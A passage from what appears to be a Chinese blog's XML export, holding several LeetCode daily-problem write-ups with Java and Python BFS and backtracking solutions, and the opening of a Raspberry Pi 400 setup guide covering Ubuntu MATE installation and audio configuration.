deque([(source, 0)]) buses = set() stops = &#123;source&#125; while q: pos, cost = q.popleft() if pos == target: return cost for bus in stations[pos] - buses: for stop in routes[bus] - stops: buses.add(bus) stops.add(stop) q.append((stop, cost + 1)) return -1]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>广度优先搜索</tag>
        <tag>bfs</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/27]]></title>
    <url>%2Fposts%2Ff3b733fc%2F</url>
    <content type="text"><![CDATA[题目：909. 蛇梯棋难度：中等 N x N 的棋盘 board 上，按从 1 到 NN 的数字给方格编号，编号*从左下角开始**，每一行交替方向。 例如，一块 6 x 6 大小的棋盘，编号如下： r 行 c 列的棋盘，按前述方法编号，棋盘格中可能存在 “蛇” 或 “梯子”；如果 board[r][c] != -1，那个蛇或梯子的目的地将会是 board[r][c]。 玩家从棋盘上的方格 1 （总是在最后一行、第一列）开始出发。 每一回合，玩家需要从当前方格 x 开始出发，按下述要求前进： 选定目标方格：选择从编号 x+1，x+2，x+3，x+4，x+5，或者 x+6 的方格中选出一个目标方格 s ，目标方格的编号 &lt;= N*N。 该选择模拟了掷骰子的情景，无论棋盘大小如何，你的目的地范围也只能处于区间 [x+1, x+6] 之间。 传送玩家：如果目标方格 S 处存在蛇或梯子，那么玩家会传送到蛇或梯子的目的地。否则，玩家传送到目标方格 S。 注意，玩家在每回合的前进过程中最多只能爬过蛇或梯子一次：就算目的地是另一条蛇或梯子的起点，你也不会继续移动。 返回达到方格 N*N 所需的最少移动次数，如果不可能，则返回 -1。 示例： 123456789101112131415输入：[[-1,-1,-1,-1,-1,-1],[-1,-1,-1,-1,-1,-1],[-1,-1,-1,-1,-1,-1],[-1,35,-1,-1,13,-1],[-1,-1,-1,-1,-1,-1],[-1,15,-1,-1,-1,-1]]输出：4解释：首先，从方格 1 [第 5 行，第 0 列] 开始。你决定移动到方格 2，并必须爬过梯子移动到到方格 15。然后你决定移动到方格 17 [第 3 行，第 5 列]，必须爬过蛇到方格 13。然后你决定移动到方格 14，且必须通过梯子移动到方格 35。然后你决定移动到方格 36, 游戏结束。可以证明你需要至少 4 次移动才能到达第 N*N 个方格，所以答案是 4。 提示： 2 &lt;= board.length = board[0].length &lt;= 20 board[i][j] 介于 1 和 N*N 之间或者等于 -1。 编号为 1 的方格上没有蛇或梯子。 编号为 N*N 的方格上没有蛇或梯子。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/snakes-and-ladders/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 bfs月，这个题需要先推算出编号到坐标的关系，其他的就很常规了 解题代码1234567891011121314151617181920212223242526272829303132333435class Solution: def snakesAndLadders(self, board: List[List[int]]) -&gt; int: self.N = len(board) return self.bfs(board,1,self.N ** 2) def bfs(self,board,begin,end): vis = set() q = deque() q.append((begin,0)) vis.add(begin) while q: p = q.popleft() x = p[0] if x == end: return step step = p[1] for i in range(1,7): nx = x + i if nx &gt; end: break _x,_y = self.get(nx) if board[_x][_y] != -1: nx = board[_x][_y] if nx == end: return step + 1 if nx not in vis: vis.add(nx) q.append((nx,step + 1)) return -1 # 根据数值计算出坐标 def get(self,num): x = (num - 1) // self.N y = (num - 1) % self.N if x % 2: y = self.N - 1 - y return (self.N - 1 - x,y)]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>广度优先搜索</tag>
        <tag>bfs</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/26]]></title>
    <url>%2Fposts%2F84b0036a%2F</url>
    <content type="text"><![CDATA[题目：773. 滑动谜题难度：困难 在一个 2 x 3 的板上（board）有 5 块砖瓦，用数字 1~5 来表示, 以及一块空缺用 0 来表示. 一次移动定义为选择 0 与一个相邻的数字（上下左右）进行交换. 最终当板 board 的结果是 [[1,2,3],[4,5,0]] 谜板被解开。 给出一个谜板的初始状态，返回最少可以通过多少次移动解开谜板，如果不能解开谜板，则返回 -1 。 示例： 123输入：board = [[1,2,3],[4,0,5]]输出：1解释：交换 0 和 5 ，1 步完成 123输入：board = [[1,2,3],[5,4,0]]输出：-1解释：没有办法完成谜板 1234567891011输入：board = [[4,1,2],[5,0,3]]输出：5解释：最少完成谜板的最少移动次数是 5 ，一种移动路径:尚未移动: [[4,1,2],[5,0,3]]移动 1 次: [[4,1,2],[0,5,3]]移动 2 次: [[0,1,2],[4,5,3]]移动 3 次: [[1,0,2],[4,5,3]]移动 4 次: [[1,2,0],[4,5,3]]移动 5 次: [[1,2,3],[4,5,0]] 12输入：board = [[3,2,4],[1,5,0]]输出：14 提示： board 是一个如上所述的 2 x 3 的数组. board[i][j] 是一个 [0, 1, 2, 3, 4, 5] 的排列. 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/sliding-puzzle/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 跟昨天那题类似，bfs 解题代码java 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990class Solution &#123; public int slidingPuzzle(int[][] board) &#123; return bfs(board); &#125; public int bfs(int[][] board) &#123; // System.out.println(get(board)); Set&lt;String&gt; vis = new HashSet&lt;&gt;(); Queue&lt;Node&gt; q = new LinkedList&lt;&gt;(); q.add(new Node(board)); vis.add(get(board)); while (!q.isEmpty()) &#123; Node p = q.poll(); // System.out.println(get(p.board) + " " + p.step); if ("1,2,3,4,5,0".equals(get(p.board))) &#123; return p.step; &#125; int x = -1; int y = -1; L: for (int i = 0; i &lt; p.board.length; i++) &#123; for (int j = 0; j &lt; p.board[i].length; j++) &#123; if (p.board[i][j] == 0) &#123; x = i; y = j; break L; &#125; &#125; &#125; // 尝试局面 for (int i = -1; i &lt;= 1; i++) &#123; if (x + i &gt;= 0 &amp;&amp; x + i &lt; p.board.length) &#123; int[][] b = swap(p.board, x, y, x + i, y); if (vis.contains(get(b))) &#123; continue; &#125; vis.add(get(b)); q.add(new Node(b, p.step + 1)); &#125; &#125; for (int i = -1;i &lt;= 1;i++) &#123; if (y + i &gt;= 0 &amp;&amp; y + i &lt; p.board[x].length) &#123; int[][] b = swap(p.board, x, y, x, y + i); if (vis.contains(get(b))) &#123; continue; &#125; vis.add(get(b)); q.add(new Node(b, p.step + 1)); &#125; &#125; &#125; return -1; &#125; int[][] swap(int[][] board, int oX, int oY, int nX, int nY) &#123; int[][] ans = new int[2][3]; for (int i = 0; i &lt; ans.length; i++) &#123; for (int j = 0; j &lt; ans[i].length; j++) &#123; ans[i][j] = board[i][j]; &#125; &#125; ans[oX][oY] = board[nX][nY]; ans[nX][nY] = board[oX][oY]; return ans; &#125; static class Node &#123; int[][] board; int step; public Node(int[][] board, int step) &#123; this.board = board; this.step = step; &#125; public Node(int[][] board) &#123; this(board, 0); &#125; &#125; public String get(int[][] board) &#123; String res = ""; for (int i = 0; i &lt; board.length; i++) &#123; for (int j = 0; j &lt; board[i].length; j++) &#123; res += board[i][j] + ","; &#125; &#125; return res.substring(0, res.length() - 1); &#125;&#125; python3 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748class Solution: def slidingPuzzle(self, board: List[List[int]]) -&gt; int: return self.bfs(board) def bfs(self,board): q = deque() vis = set() q.append((board,0)) vis.add(str(board)) while q: p = q.popleft() step = p[1] b = p[0] # print(b) if b == [[1,2,3],[4,5,0]]: return step x = -1 y = -1 for i in range(0,len(b)): flag = False for j in range(0,len(b[i])): if not b[i][j]: x = i y = j flag = True break if flag: break for i in range(-1,2): if x + i &gt;= 0 and x + i &lt; len(b): m = self.swap(b,x,y,x + i,y) if str(m) in vis: continue vis.add(str(m)) q.append((m,step + 1)) for i in range(-1,2): if y + i &gt;= 0 and y + i &lt; len(b[x]): m = self.swap(b,x,y,x,y + i) if str(m) in vis: continue vis.add(str(m)) q.append((m,step + 1)) return -1 def swap(self,board,oX,oY,nX,nY): b = copy.deepcopy(board) # print(oX,oY,nX,nY) b[oX][oY] = board[nX][nY] b[nX][nY] = board[oX][oY] return b]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>广度优先搜索</tag>
        <tag>bfs</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/25]]></title>
    <url>%2Fposts%2F1db952d0%2F</url>
    <content type="text"><![CDATA[题目：752. 打开转盘锁难度：中等 你有一个带有四个圆形拨轮的转盘锁。每个拨轮都有10个数字： ‘0’, ‘1’, ‘2’, ‘3’, ‘4’, ‘5’, ‘6’, ‘7’, ‘8’, ‘9’ 。每个拨轮可以自由旋转：例如把 ‘9’ 变为 ‘0’，’0’ 变为 ‘9’ 。每次旋转都只能旋转一个拨轮的一位数字。 锁的初始数字为 ‘0000’ ，一个代表四个拨轮的数字的字符串。 列表 deadends 包含了一组死亡数字，一旦拨轮的数字和列表里的任何一个元素相同，这个锁将会被永久锁定，无法再被旋转。 字符串 target 代表可以解锁的数字，你需要给出解锁需要的最小旋转次数，如果无论如何不能解锁，返回 -1 。 示例 1: 123456输入：deadends = [&quot;0201&quot;,&quot;0101&quot;,&quot;0102&quot;,&quot;1212&quot;,&quot;2002&quot;], target = &quot;0202&quot;输出：6解释：可能的移动序列为 &quot;0000&quot; -&gt; &quot;1000&quot; -&gt; &quot;1100&quot; -&gt; &quot;1200&quot; -&gt; &quot;1201&quot; -&gt; &quot;1202&quot; -&gt; &quot;0202&quot;。注意 &quot;0000&quot; -&gt; &quot;0001&quot; -&gt; &quot;0002&quot; -&gt; &quot;0102&quot; -&gt; &quot;0202&quot; 这样的序列是不能解锁的，因为当拨动到 &quot;0102&quot; 时这个锁就会被锁定。 示例 2: 1234输入: deadends = [&quot;8888&quot;], target = &quot;0009&quot;输出：1解释：把最后一位反向旋转一次即可 &quot;0000&quot; -&gt; &quot;0009&quot;。 示例 3: 1234输入: deadends = [&quot;8887&quot;,&quot;8889&quot;,&quot;8878&quot;,&quot;8898&quot;,&quot;8788&quot;,&quot;8988&quot;,&quot;7888&quot;,&quot;9888&quot;], target = &quot;8888&quot;输出：-1解释：无法旋转到目标数字且不被锁定。 示例 4: 12输入: deadends = [&quot;0000&quot;], target = &quot;8888&quot;输出：-1 提示： 1 &lt;= deadends.length &lt;= 500 deadends[i].length == 4 target.length == 4 target 不在 deadends 之中 target 和 deadends[i] 仅由若干位数字组成 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/open-the-lock/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 转换为不带权最短路径问题，今天开始，刷题用python3 解题代码java 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960class Solution &#123; public int openLock(String[] deadends, String target) &#123; boolean[] vis = new boolean[10000]; for (String s : deadends) &#123; vis[Integer.valueOf(s)] = true; &#125; return bfs(vis,"0000",target); &#125; private int bfs(boolean[] vis,String begin,String end) &#123; int ans = -1; if (vis[Integer.valueOf(begin)]) &#123; return ans; &#125; Queue&lt;Node&gt; q = new LinkedList&lt;&gt;(); q.add(new Node(begin)); vis[Integer.valueOf(begin)] = true; while (!q.isEmpty()) &#123; Node p = q.poll(); if (p.v.toString().equals(end)) &#123; return p.step; &#125; for (int i = 0;i &lt; p.v.length();i++) &#123; char origin = p.v.charAt(i); for (int j = -1;j &lt;= 1;j++) &#123; p.v.setCharAt(i,origin); int d = origin - '0' + j; if (d == -1) &#123; d = 9; &#125; if (d == 10) &#123; d = 0; &#125; p.v.setCharAt(i,(char) (d + '0')); String nextV = p.v.toString(); if (vis[Integer.valueOf(nextV)]) &#123; continue; &#125; vis[Integer.valueOf(nextV)] = true; q.add(new Node(nextV,p.step + 1)); &#125; p.v.setCharAt(i,origin); &#125; &#125; return ans; &#125; static class Node&#123; StringBuilder v; int step; public Node(String v) &#123; this(v,0); &#125; public Node(String v,int step) &#123; this.v = new StringBuilder(v); this.step = step; &#125; &#125;&#125; python3 1234567891011121314151617181920212223242526272829303132333435class Solution: def openLock(self, deadends: List[str], target: str) -&gt; int: vis = &#123;&#125; for x in deadends: vis[x] = True return self.bfs(vis,'0000',target) def bfs(self,vis,begin,end): ans = -1 if begin in vis: return ans q = [] q.append((begin,0)) vis[begin] = True while len(q): p = q[0] # print(p) if p[0] == end: return p[1] for i in range(0,len(p[0])): step = p[1] for j in range(-1,2): s = list(p[0]) d = int(p[0][i]) + j if d == 10: d = 0 if d == -1: d = 9 s[i] = str(d) next = ''.join(s) if next in vis: continue vis[next] = True q.append((next,step + 1)) del q[0] return -1]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>广度优先搜索</tag>
        <tag>bfs</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/23]]></title>
    <url>%2Fposts%2Ff4daf7e5%2F</url>
    <content type="text"><![CDATA[题目：剑指 Offer 15. 二进制中1的个数难度：简单 请实现一个函数，输入一个整数（以二进制串形式），输出该数二进制表示中 1 的个数。例如，把 9 表示成二进制是 1001，有 2 位是 1。因此，如果输入 9，则该函数输出 2。 示例 1： 123输入：00000000000000000000000000001011输出：3解释：输入的二进制串 00000000000000000000000000001011 中，共有三位为 &apos;1&apos;。 示例 2： 123输入：00000000000000000000000010000000输出：1解释：输入的二进制串 00000000000000000000000010000000 中，共有一位为 &apos;1&apos;。 示例 3： 123输入：11111111111111111111111111111101输出：31解释：输入的二进制串 11111111111111111111111111111101 中，共有 31 位为 &apos;1&apos;。 提示： 输入必须是长度为 32 的 二进制串 。 注意：本题与主站 191 题相同：https://leetcode-cn.com/problems/number-of-1-bits/ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/er-jin-zhi-zhong-1de-ge-shu-lcof/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 n &amp; (n - 1)去掉n的二进制中最低位的1 解题代码1234567891011public class Solution &#123; // you need to treat n as an unsigned value public int hammingWeight(int n) &#123; int ans = 0; while (n != 0) &#123; ans++; n = n &amp; (n - 1); &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/22]]></title>
    <url>%2Fposts%2F83ddc773%2F</url>
    <content type="text"><![CDATA[题目：剑指 Offer 38. 字符串的排列难度：中等 输入一个字符串，打印出该字符串中字符的所有排列。 你可以以任意顺序返回这个字符串数组，但里面不能有重复元素。 示例: 12输入：s = &quot;abc&quot;输出：[&quot;abc&quot;,&quot;acb&quot;,&quot;bac&quot;,&quot;bca&quot;,&quot;cab&quot;,&quot;cba&quot;] 限制： 1 &lt;= s 的长度 &lt;= 8 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/zi-fu-chuan-de-pai-lie-lcof/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 回溯法解决有重复的元素的集合全排列问题 解题代码1234567891011121314151617181920212223242526272829303132333435363738class Solution &#123; public String[] permutation(String s) &#123; dfs(s.toCharArray(),0); return ans.toArray(new String[ans.size()]); &#125; List&lt;String&gt; ans = new ArrayList&lt;&gt;(); private void dfs(char[] array,int c) &#123; if (c &gt;= array.length) &#123; ans.add(new String(array)); return; &#125; for (int i = c;i &lt; array.length;i++) &#123; if (check(array,c,i)) &#123; continue; &#125; swap(array,i,c); dfs(array,c + 1); swap(array,i,c); &#125; &#125; private void swap(char[] array,int i,int j) &#123; char t = array[i]; array[i] = array[j]; array[j] = t; &#125; private boolean check(char[] array,int begin,int end) &#123; for (int i = begin;i &lt; end;i++) &#123; if (array[i] == array[end]) &#123; return true; &#125; &#125; return false; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>回溯算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/21]]></title>
    <url>%2Fposts%2F1ad496c9%2F</url>
    <content type="text"><![CDATA[题目：401. 二进制手表难度：简单 二进制手表顶部有 4 个 LED 代表小时（0-11），底部的 6 个 LED 代表分钟（0-59）。每个 LED 代表一个 0 或 1，最低位在右侧。 例如，下面的二进制手表读取 “3:25” 。 （图源：WikiMedia - Binary clock samui moon.jpg ，许可协议：Attribution-ShareAlike 3.0 Unported (CC BY-SA 3.0) ） 给你一个整数 turnedOn ，表示当前亮着的 LED 的数量，返回二进制手表可以表示的所有可能时间。你可以 按任意顺序 返回答案。 小时不会以零开头： 例如，”01:00” 是无效的时间，正确的写法应该是 “1:00” 。 分钟必须由两位数组成，可能会以零开头： 例如，”10:2” 是无效的时间，正确的写法应该是 “10:02” 。 示例 1： 12输入：turnedOn = 1输出：[&quot;0:01&quot;,&quot;0:02&quot;,&quot;0:04&quot;,&quot;0:08&quot;,&quot;0:16&quot;,&quot;0:32&quot;,&quot;1:00&quot;,&quot;2:00&quot;,&quot;4:00&quot;,&quot;8:00&quot;] 示例 2： 12输入：turnedOn = 9输出：[] 提示： 0 &lt;= turnedOn &lt;= 10 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/binary-watch/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 回溯法枚举每个位置 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142434445class Solution &#123; public List&lt;String&gt; readBinaryWatch(int turnedOn) &#123; int[] light = new int[10]; dfs(light,0,0,turnedOn); return ans; &#125; List&lt;String&gt; ans = new ArrayList&lt;&gt;(); public void dfs(int[] light,int on,int cur,int turnedOn) &#123; if (cur &gt;= light.length) &#123; if (on == turnedOn) &#123; check(light); &#125; return; &#125; if (on == turnedOn) &#123; check(light); return; &#125; for (int i = cur;i &lt; light.length;i++) &#123; if (light[i] == 0) &#123; light[i] = 1; dfs(light,on + 1,i + 1,turnedOn); light[i] = 0; &#125; &#125; &#125; public void check(int[] light) &#123; int h = 0; for (int i = 0;i &lt; 4;i++) &#123; h += light[i] * (1 &lt;&lt; i); &#125; int m = 0; for (int i = 4;i &lt; light.length;i++) &#123; m += light[i] * (1 &lt;&lt; (i - 4)); &#125; // System.out.println(String.format("%d:%02d",h,m)); // System.out.println(Arrays.toString(light)); if (h &gt;= 0 &amp;&amp; h &lt;= 11 &amp;&amp; m &gt;= 0 &amp;&amp; m &lt;= 59) &#123; ans.add(String.format("%d:%02d",h,m)); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>回溯算法</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/20]]></title>
    <url>%2Fposts%2F6dd3a65f%2F</url>
    <content type="text"><![CDATA[题目：1600. 皇位继承顺序难度：中等 一个王国里住着国王、他的孩子们、他的孙子们等等。每一个时间点，这个家庭里有人出生也有人死亡。 这个王国有一个明确规定的皇位继承顺序，第一继承人总是国王自己。我们定义递归函数 Successor(x, curOrder) ，给定一个人 x 和当前的继承顺序，该函数返回 x 的下一继承人。 12345Successor(x, curOrder): 如果 x 没有孩子或者所有 x 的孩子都在 curOrder 中： 如果 x 是国王，那么返回 null 否则，返回 Successor(x 的父亲, curOrder) 否则，返回 x 不在 curOrder 中最年长的孩子 比方说，假设王国由国王，他的孩子 Alice 和 Bob （Alice 比 Bob 年长）和 Alice 的孩子 Jack 组成。 一开始， curOrder 为 [“king”]. 调用 Successor(king, curOrder) ，返回 Alice ，所以我们将 Alice 放入 curOrder 中，得到 [“king”, “Alice”] 。 调用 Successor(Alice, curOrder) ，返回 Jack ，所以我们将 Jack 放入 curOrder 中，得到 [“king”, “Alice”, “Jack”] 。 调用 Successor(Jack, curOrder) ，返回 Bob ，所以我们将 Bob 放入 curOrder 中，得到 [“king”, “Alice”, “Jack”, “Bob”] 。 调用 Successor(Bob, curOrder) ，返回 null 。最终得到继承顺序为 [“king”, “Alice”, “Jack”, “Bob”] 。 通过以上的函数，我们总是能得到一个唯一的继承顺序。 请你实现 ThroneInheritance 类： ThroneInheritance(string kingName) 初始化一个 ThroneInheritance 类的对象。国王的名字作为构造函数的参数传入。 void birth(string parentName, string childName) 表示 parentName 新拥有了一个名为 childName 的孩子。 void death(string name) 表示名为 name 的人死亡。一个人的死亡不会影响 Successor 函数，也不会影响当前的继承顺序。你可以只将这个人标记为死亡状态。 string[] getInheritanceOrder() 返回 除去 死亡人员的当前继承顺序列表。 示例： 1234567891011121314151617输入：[&quot;ThroneInheritance&quot;, &quot;birth&quot;, &quot;birth&quot;, &quot;birth&quot;, &quot;birth&quot;, &quot;birth&quot;, &quot;birth&quot;, &quot;getInheritanceOrder&quot;, &quot;death&quot;, &quot;getInheritanceOrder&quot;][[&quot;king&quot;], [&quot;king&quot;, &quot;andy&quot;], [&quot;king&quot;, &quot;bob&quot;], [&quot;king&quot;, &quot;catherine&quot;], [&quot;andy&quot;, &quot;matthew&quot;], [&quot;bob&quot;, &quot;alex&quot;], [&quot;bob&quot;, &quot;asha&quot;], [null], [&quot;bob&quot;], [null]]输出：[null, null, null, null, null, null, null, [&quot;king&quot;, &quot;andy&quot;, &quot;matthew&quot;, &quot;bob&quot;, &quot;alex&quot;, &quot;asha&quot;, &quot;catherine&quot;], null, [&quot;king&quot;, &quot;andy&quot;, &quot;matthew&quot;, &quot;alex&quot;, &quot;asha&quot;, &quot;catherine&quot;]]解释：ThroneInheritance t= new ThroneInheritance(&quot;king&quot;); // 继承顺序：kingt.birth(&quot;king&quot;, &quot;andy&quot;); // 继承顺序：king &gt; andyt.birth(&quot;king&quot;, &quot;bob&quot;); // 继承顺序：king &gt; andy &gt; bobt.birth(&quot;king&quot;, &quot;catherine&quot;); // 继承顺序：king &gt; andy &gt; bob &gt; catherinet.birth(&quot;andy&quot;, &quot;matthew&quot;); // 继承顺序：king &gt; andy &gt; matthew &gt; bob &gt; catherinet.birth(&quot;bob&quot;, &quot;alex&quot;); // 继承顺序：king &gt; andy &gt; matthew &gt; bob &gt; alex &gt; catherinet.birth(&quot;bob&quot;, &quot;asha&quot;); // 继承顺序：king &gt; andy &gt; matthew &gt; bob &gt; alex &gt; asha &gt; catherinet.getInheritanceOrder(); // 返回 [&quot;king&quot;, &quot;andy&quot;, &quot;matthew&quot;, &quot;bob&quot;, &quot;alex&quot;, &quot;asha&quot;, &quot;catherine&quot;]t.death(&quot;bob&quot;); // 继承顺序：king &gt; andy &gt; matthew &gt; bob（已经去世）&gt; alex &gt; asha &gt; catherinet.getInheritanceOrder(); // 返回 [&quot;king&quot;, &quot;andy&quot;, &quot;matthew&quot;, &quot;alex&quot;, &quot;asha&quot;, &quot;catherine&quot;] 提示： 1 &lt;= kingName.length, parentName.length, childName.length, name.length &lt;= 15 kingName，parentName， childName 和 name 仅包含小写英文字母。 所有的参数 childName 和 kingName 互不相同。 所有 death 函数中的死亡名字 name 要么是国王，要么是已经出生了的人员名字。 每次调用 birth(parentName, childName) 时，测试用例都保证 parentName 对应的人员是活着的。 最多调用 105 次birth 和 death 。 最多调用 10 次 getInheritanceOrder 。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/throne-inheritance/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 本质上是设计一颗多叉树，然后进行先序遍历的问题 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354class ThroneInheritance &#123; static class Tree&#123; String v; boolean isAlive = true; List&lt;Tree&gt; children = new ArrayList&lt;&gt;(); &#125; Tree root; Map&lt;String,Tree&gt; table = new HashMap&lt;&gt;(); public ThroneInheritance(String kingName) &#123; root = new Tree(); root.v = kingName; table.put(kingName,root); &#125; public void birth(String parentName, String childName) &#123; Tree child = new Tree(); child.v = childName; table.get(parentName).children.add(child); table.put(childName,child); &#125; public void death(String name) &#123; table.get(name).isAlive = false; &#125; public List&lt;String&gt; getInheritanceOrder() &#123; List&lt;String&gt; ans = new ArrayList&lt;&gt;(); preOrder(ans,root); return ans; &#125; private void preOrder(List&lt;String&gt; ans,Tree root) &#123; if (root == null) &#123; return; &#125; if (root.isAlive) &#123; ans.add(root.v); &#125; for (Tree c : root.children) &#123; preOrder(ans,c); &#125; &#125;&#125;/** * Your ThroneInheritance object will be instantiated and called as such: * ThroneInheritance obj = new ThroneInheritance(kingName); * obj.birth(parentName,childName); * obj.death(name); * List&lt;String&gt; param_3 = obj.getInheritanceOrder(); */]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>设计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/19]]></title>
    <url>%2Fposts%2F3f224d38%2F</url>
    <content type="text"><![CDATA[题目：1239. 串联字符串的最大长度难度：中等 给定一个字符串数组 arr，字符串 s 是将 arr 某一子序列字符串连接所得的字符串，如果 s 中的每一个字符都只出现过一次，那么它就是一个可行解。 请返回所有可行解 s 中最长长度。 示例 1： 123输入：arr = [&quot;un&quot;,&quot;iq&quot;,&quot;ue&quot;]输出：4解释：所有可能的串联组合是 &quot;&quot;,&quot;un&quot;,&quot;iq&quot;,&quot;ue&quot;,&quot;uniq&quot; 和 &quot;ique&quot;，最大长度为 4。 示例 2： 123输入：arr = [&quot;cha&quot;,&quot;r&quot;,&quot;act&quot;,&quot;ers&quot;]输出：6解释：可能的解答有 &quot;chaers&quot; 和 &quot;acters&quot;。 示例 3： 12输入：arr = [&quot;abcdefghijklmnopqrstuvwxyz&quot;]输出：26 提示： 1 &lt;= arr.length &lt;= 16 1 &lt;= arr[i].length &lt;= 26 arr[i] 中只含有小写英文字母 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/maximum-length-of-a-concatenated-string-with-unique-characters/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 暴力搜索 解题代码1234567891011121314151617181920212223class Solution &#123; public int maxLength(List&lt;String&gt; arr) &#123; dfs(arr,0,""); return ans; &#125; int ans = 0; private void dfs(List&lt;String&gt; arr,int c,String t) &#123; for (int i = 0;i &lt; t.length();i++) &#123; if (t.indexOf(t.charAt(i),i + 1) != -1) &#123; return; &#125; &#125; ans = Math.max(t.length(),ans); for (int i = c;i &lt; arr.size();i++) &#123; String s = arr.get(i); dfs(arr,i + 1,t + s); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>回溯算法</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一份不专业的树梅派400使用指南]]></title>
    <url>%2Fposts%2F7004a632%2F</url>
    <content type="text"><![CDATA[前段时间入手了树梅派400，补一篇使用指南，内容涉及购买建议，安装系统，软件配置，硬件搭配等 树梅派400简介一台键盘一体机，连接电源，鼠标和显示器就可以作为一台生产力工具使用了 购买建议建议购买套装版，否则需要单独自行购买电源等配件，内含：电源，树梅派400一体机，鼠标，高速sd卡，读卡器以及micro-HDMI连接线等 硬件搭配 显示器：建议搭配一台带有扬声器的显示器，否则需要外接蓝牙音箱或者usb声卡，不然没声音 外设：如果你有做图像相关需求的话，可以搭配一个USB摄像头（有套装版是包含这个的） 安装系统个人觉得官方推荐的Raspberry Pi OS不好用，我更喜欢ubantu系统，然后使用了一段时间的ubantu-desktop感觉太重了，树梅派400的硬件跑起来有点难顶，所以这里我推荐使用ubantu-mate，更轻 准备 sd卡，读卡器 Win32DiskImager，下载地址：https://win32diskimager.download/download-win32-disk-imager/ ubantu-mate镜像，下载地址：https://ubuntu-mate.org/download/arm64/groovy/ ，选择Direct Download即可 烧录插入读卡器，打开Win32DiskImager，选择你解压好的镜像，write即可 开机插入刻录好的sd卡，连接电源，鼠标，显示器（连接到靠近电源的micro-hdmi口），进入系统，完成系统初始设置，连接网络，然后更新一下系统（否则蓝牙适配器不可用） 系统配置 卸载掉超级不好用的snap，打开终端，输入命令sudo apt autoremove snapd 解决睡眠之后唤醒不了的问题 安装laptop-mode-tools工具包，输入命令sudo apt install laptop-mode-tools 修改配置文件，输入命令sudo gedit /etc/laptop-mode/laptop-mode.conf 将ENABLE_LAPTOP_MODE_TOOLS,ENABLE_LAPTOP_MODE_ON_BATTERY,ENABLE_LAPTOP_MODE_ON_AC,ENABLE_LAPTOP_MODE_WHEN_LID_CLOSED四项的值都设置为1 启动laptop_mode,输入命令sudo laptop_mode start 设置启用hdmi音频，修改文件/boot/firmware/config.txt，把#hdmi_drive=2 修改为 hdmi_drive=2，然后重启系统（也可以只重启一次系统） 配置默认声卡 插入usb声卡 aplay -l 查看系统所有声卡 修改文件/boot/firmware/config.txt，把dtparam=audio=on 修改为 #dtparam=audio=on，禁用板载声卡，树梅派400是没有这个东西的，禁用后重启系统默认声卡不会复原 新增文件/etc/asount.conf，内容为：下面的2,是你上面查看到的所有声卡中，你想设置为默认声卡的那个编号 123defaults.ctl.card 